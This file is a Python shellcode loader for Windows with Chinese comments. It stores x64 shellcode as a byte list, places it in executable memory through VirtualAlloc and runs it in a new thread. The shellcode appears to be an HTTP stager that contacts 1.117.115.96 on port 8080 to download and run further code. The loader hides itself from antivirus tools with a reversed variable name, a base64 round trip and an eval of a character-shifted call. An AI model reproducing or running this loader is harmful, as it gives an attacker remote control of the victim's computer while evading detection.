# coding=utf-8
import string
import base64
import codecs
import ctypes
# 读取llehscode文件
llehscode=''
payload=['xfc', 'x48', 'x83', 'xe4', 'xf0', 'xe8', 'xc8', 'x00', 'x00', 'x00', 'x41', 'x51', 'x41', 'x50', 'x52', 'x51', 'x56', 'x48', 'x31', 'xd2', 'x65', 'x48', 'x8b', 'x52', 'x60', 'x48', 'x8b', 'x52', 'x18', 'x48', 'x8b', 'x52', 'x20', 'x48', 'x8b', 'x72', 'x50', 'x48', 'x0f', 'xb7', 'x4a', 'x4a', 'x4d', 'x31', 'xc9', 'x48', 'x31', 'xc0', 'xac', 'x3c', 'x61', 'x7c', 'x02', 'x2c', 'x20', 'x41', 'xc1', 'xc9', 'x0d', 'x41', 'x01', 'xc1', 'xe2', 'xed', 'x52', 'x41', 'x51', 'x48', 'x8b', 'x52', 'x20', 'x8b', 'x42', 'x3c', 'x48', 'x01', 'xd0', 'x66', 'x81', 'x78', 'x18', 'x0b', 'x02', 'x75', 'x72', 'x8b', 'x80', 'x88', 'x00', 'x00', 'x00', 'x48', 'x85', 'xc0', 'x74', 'x67', 'x48', 'x01', 'xd0', 'x50', 'x8b', 'x48', 'x18', 'x44', 'x8b', 'x40', 'x20', 'x49', 'x01', 'xd0', 'xe3', 'x56', 'x48', 'xff', 'xc9', 'x41', 'x8b', 'x34', 'x88', 'x48', 'x01', 'xd6', 'x4d', 'x31', 'xc9', 'x48', 'x31', 'xc0', 'xac', 'x41', 'xc1', 'xc9', 'x0d', 'x41', 'x01', 'xc1', 'x38', 'xe0', 'x75', 'xf1', 'x4c', 'x03', 'x4c', 'x24', 'x08', 'x45', 'x39', 'xd1', 'x75', 'xd8', 'x58', 'x44', 'x8b', 'x40', 'x24', 'x49', 'x01', 'xd0', 'x66', 'x41', 'x8b', 'x0c', 'x48', 'x44', 'x8b', 'x40', 'x1c', 'x49', 'x01', 'xd0', 'x41', 'x8b', 'x04', 'x88', 'x48', 'x01', 'xd0', 'x41', 'x58', 'x41', 'x58', 'x5e', 'x59', 'x5a', 'x41', 'x58', 'x41', 'x59', 'x41', 'x5a', 'x48', 'x83', 'xec', 'x20', 'x41', 'x52', 'xff', 'xe0', 'x58', 'x41', 'x59', 'x5a', 'x48', 'x8b', 'x12', 'xe9', 'x4f', 'xff', 'xff', 'xff', 'x5d', 'x6a', 'x00', 'x49', 'xbe', 'x77', 'x69', 'x6e', 'x69', 'x6e', 'x65', 'x74', 'x00', 'x41', 'x56', 'x49', 'x89', 'xe6', 'x4c', 'x89', 'xf1', 'x41', 'xba', 'x4c', 'x77', 'x26', 'x07', 'xff', 'xd5', 'x48', 'x31', 'xc9', 'x48', 'x31', 'xd2', 'x4d', 'x31', 'xc0', 'x4d', 'x31', 'xc9', 'x41', 'x50', 'x41', 'x50', 'x41', 'xba', 'x3a', 'x56', 'x79', 'xa7', 'xff', 'xd5', 'xe9', 'x93', 'x00', 'x00', 'x00', 'x5a', 'x48', 'x89', 'xc1', 'x41', 'xb8', 'x90', 'x1f', 'x00', 'x00', 'x4d', 'x31', 'xc9', 'x41', 'x51', 'x41', 'x51', 'x6a', 'x03', 'x41', 'x51', 'x41', 'xba', 'x57', 'x89', 'x9f', 'xc6', 'xff', 'xd5', 'xeb', 'x79', 'x5b', 'x48', 'x89', 'xc1', 'x48', 'x31', 'xd2', 'x49', 'x89', 'xd8', 'x4d', 'x31', 'xc9', 'x52', 'x68', 'x00', 'x32', 'xc0', 'x84', 'x52', 'x52', 'x41', 'xba', 'xeb', 'x55', 'x2e', 'x3b', 'xff', 'xd5', 'x48', 'x89', 'xc6', 'x48', 'x83', 'xc3', 'x50', 'x6a', 'x0a', 'x5f', 'x48', 'x89', 'xf1', 'xba', 'x1f', 'x00', 'x00', 'x00', 'x6a', 'x00', 'x68', 'x80', 'x33', 'x00', 'x00', 'x49', 'x89', 'xe0', 'x41', 'xb9', 'x04', 'x00', 'x00', 'x00', 'x41', 'xba', 'x75', 'x46', 'x9e', 'x86', 'xff', 'xd5', 'x48', 'x89', 'xf1', 'x48', 'x89', 'xda', 'x49', 'xc7', 'xc0', 'xff', 'xff', 'xff', 'xff', 'x4d', 'x31', 'xc9', 'x52', 'x52', 'x41', 'xba', 'x2d', 'x06', 'x18', 'x7b', 'xff', 'xd5', 'x85', 'xc0', 'x0f', 'x85', 'x9d', 'x01', 'x00', 'x00', 'x48', 'xff', 'xcf', 'x0f', 'x84', 'x8c', 'x01', 'x00', 'x00', 'xeb', 'xb3', 'xe9', 'xe4', 'x01', 'x00', 'x00', 'xe8', 'x82', 'xff', 'xff', 'xff', 'x2f', 'x45', 'x7a', 'x31', 'x6d', 'x00', 'xd2', 'x8d', 'xe3', 'x52', 'x20', 'xfc', 'xc6', 'x76', 'x30', 'xf1', 'x82', 'x2e', 'x60', 'xf4', 'xbd', 'xba', 'x0d', 'x91', 'xf3', 'xe9', 'xa8', 'xaa', 'x82', 'xa0', 'x04', 'x3e', 'x73', 'xb0', 'x97', 'x0c', 'x65', 'x47', 'xde', 'xf7', 'x6a', 'x6f', 'xb4', 'xd9', 'x87', 'x42', 'x35', 'x27', 'x20', 'xf1', 'x70', 'xd8', 'x32', 'xe1', 'xb2', 'x55', 'x95', 'xbc', 'x88', 'x96', 'xa4', 'xb3', 'xcc', 'xd6', 'xc6', 'x23', 'xea', 'x43', 'x3d', 'x37', 'x13', 'xb2', 'x0e', 'x09', 'xa3', 'xa5', 'xc9', 'x24', 'x22', 'x00', 'x55', 'x73', 'x65', 'x72', 'x2d', 'x41', 'x67', 'x65', 'x6e', 'x74', 'x3a', 'x20', 'x4d', 'x6f', 'x7a', 'x69', 'x6c', 'x6c', 'x61', 'x2f', 'x35', 'x2e', 'x30', 'x20', 'x28', 'x63', 'x6f', 'x6d', 'x70', 'x61', 'x74', 'x69', 'x62', 'x6c', 'x65', 'x3b', 'x20', 'x4d', 'x53', 'x49', 'x45', 'x20', 'x39', 'x2e', 'x30', 'x3b', 'x20', 'x57', 'x69', 'x6e', 'x64', 'x6f', 'x77', 'x73', 'x20', 'x4e', 'x54', 'x20', 'x36', 'x2e', 'x31', 'x3b', 'x20', 'x57', 'x69', 'x6e', 'x36', 'x34', 'x3b', 'x20', 'x78', 'x36', 'x34', 'x3b', 'x20', 'x54', 'x72', 'x69', 'x64', 'x65', 'x6e', 'x74', 'x2f', 'x35', 'x2e', 'x30', 'x3b', 'x20', 'x4d', 'x41', 'x41', 'x55', 'x3b', 'x20', 'x4e', 'x50', 'x30', 'x38', 'x29', 'x0d', 'x0a', 'x00', 'x63', 'x77', 'x4a', 'xa8', 'xc7', 'x9a', 'x16', 'xe5', 'xc7', 'xa0', 'xf8', 'x0c', 'x82', 'x3d', 'xa5', 'xc4', 'xf3', 'x03', 'x94', 'xf4', 'x15', 'xc7', 'xf1', 'x0a', 'x25', 'x93', 'xee', 'xe9', 'x76', 'xc9', 'x2a', 'x2f', 'xde', 'x33', 'x17', 'x68', 'x91', 'xf8', 'xec', 'x3f', 'x0e', 'x6f', 'x96', 'x18', 'x42', 'xcc', 'xc4', 'x35', 'x01', 'xc2', 'x00', 'x88', 'xd5', 'x3d', 'xa3', 'x54', 'xcd', 'x86', 'x1d', 'x69', 'x31', 'x6f', 'x44', 'x35', 'x87', 'x8c', 'xc6', 'x28', 'xb5', 'xd9', 'x10', 'xd5', 'xa9', 'x58', 'xa4', 'xb6', 'x12', 'xd8', 'xb1', 'xb2', 'x33', 'x3b', 'xd2', 'xee', 'xfd', 'x6f', 'xd9', 'xe8', 'xc0', 'xb4', 'x20', 'x71', 'xad', 'xb2', 'xae', 'x1f', 'x3b', 'x97', 'x60', 'x73', 'xee', 'x1a', 'x56', 'x27', 'x5a', 'x8d', 'xa6', 'x1b', 'x5f', 'x0c', 'x08', 'x87', 'x59', 'xfa', 'xd9', 'xc2', 'x41', 'x3d', 'x7f', 'x51', 'x8c', 'x63', 'x9a', 'x59', 'x14', 'x35', 'xcf', 'x9a', 'x82', 'xae', 'x9e', 'xd1', 'x80', 'xf2', 'xda', 'xae', 'x75', 'xc9', 'x8c', 'xea', 'xa0', 'x37', 'x12', 'xe3', 'x08', 'x0f', 'x35', 'x7a', 'x3f', 'x8d', 'x5a', 'x26', 'x39', 'x46', 'x00', 'xfa', 'x81', 'xca', 'x37', 'xf6', 'xf1', 'xed', 'x10', 'xb5', 'xc5', 'xdc', 'x6f', 'xc3', 'xbb', 'xbc', 'x4e', 'x4a', 'x20', 'xbb', 'xd3', 'x0d', 'x90', 'xc1', 'xb7', 'x91', 'x6f', 'x6c', 'x1b', 'x50', 'x06', 'xda', 'xea', 'xf8', 'x81', 'x3f', 'x50', 'x28', 'x4b', 'xf8', 'xb7', 'x36', 'x95', 'x28', 'xe8', 'x0e', 'x91', 'x00', 'x41', 'xbe', 'xf0', 'xb5', 'xa2', 'x56', 'xff', 'xd5', 'x48', 'x31', 'xc9', 'xba', 'x00', 'x00', 'x40', 'x00', 'x41', 'xb8', 'x00', 'x10', 'x00', 'x00', 'x41', 'xb9', 'x40', 'x00', 'x00', 'x00', 'x41', 'xba', 'x58', 'xa4', 'x53', 'xe5', 'xff', 'xd5', 'x48', 'x93', 'x53', 'x53', 'x48', 'x89', 'xe7', 'x48', 'x89', 'xf1', 'x48', 'x89', 'xda', 'x41', 'xb8', 'x00', 'x20', 'x00', 'x00', 'x49', 'x89', 'xf9', 'x41', 'xba', 'x12', 'x96', 'x89', 'xe2', 'xff', 'xd5', 'x48', 'x83', 'xc4', 'x20', 'x85', 'xc0', 'x74', 'xb6', 'x66', 'x8b', 'x07', 'x48', 'x01', 'xc3', 'x85', 'xc0', 'x75', 'xd7', 'x58', 'x58', 'x58', 'x48', 'x05', 'x00', 'x00', 'x00', 'x00', 'x50', 'xc3', 'xe8', 'x7f', 'xfd', 'xff', 'xff', 'x31', 'x2e', 'x31', 'x31', 'x37', 'x2e', 'x31', 'x31', 'x35', 'x2e', 'x39', 'x36', 'x00', 'x49', 'x96', 'x02', 'xd2']
for i in payload:
    i='\\'+i
    llehscode +=i

# 取出llehscode内容
llehscode="\""+llehscode+"\""
print(llehscode)
#llehscode = open('hh.py')
#llehscode = llehscode.read()
s1 = llehscode.find("\"")+1
s2 = llehscode.rfind("\"")

llehscode =  llehscode[s1:s2]


# 把llehscode base64加密并写入base64.txt文件
base64_llehscode = base64.b64encode(llehscode.encode('UTF-8'))

llehscode = base64_llehscode
llehscode = base64.b64decode(llehscode)
llehscode = codecs.escape_decode(llehscode)[0]
llehscode = bytearray(llehscode)
# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(llehscode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
# 放入llehscode
buf = (ctypes.c_char * len(llehscode)).from_buffer(llehscode)
flag=[105, 122, 127, 118, 107, 121, 52, 125, 111, 116, 106, 114, 114, 52, 113, 107, 120, 116, 107, 114, 57, 56, 52, 88, 122, 114, 83, 117, 124, 107, 83, 107, 115, 117, 120, 127, 46, 38, 38, 38, 38, 105, 122, 127, 118, 107, 121, 52, 105, 101, 123, 111, 116, 122, 60, 58, 46, 118, 122, 120, 47, 50, 38, 38, 38, 38, 104, 123, 108, 50, 38, 38, 38, 38, 105, 122, 127, 118, 107, 121, 52, 105, 101, 111, 116, 122, 46, 114, 107, 116, 46, 114, 114, 107, 110, 121, 105, 117, 106, 107, 47, 47, 47]
flag1=""
for i in flag:
    flag1 += chr((i)-6)
eval(flag1)
# 创建一个线程从llehscode放置位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
# 等待上面创建的线程运行完

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
